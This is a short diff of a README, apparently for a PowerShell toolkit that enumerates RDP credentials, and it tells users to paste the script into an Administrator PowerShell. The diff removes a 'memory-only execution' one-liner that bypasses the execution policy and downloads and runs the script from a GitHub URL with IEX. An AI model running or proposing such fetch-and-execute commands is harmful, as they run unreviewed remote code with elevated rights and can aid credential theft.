@@ -63,8 +63,3 @@
 1. Open PowerShell (preferably as Administrator)
 2. Paste the entire script and press Enter
 3. Use the menu: type `1`–`15`, `C`, or `0`
-
-### One-liner (memory-only execution)
-
-```powershell
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/shaheeryasiofficial/rdp-cred-enum-toolkit/main/rdp-cred-enum-toolkit.ps1')"
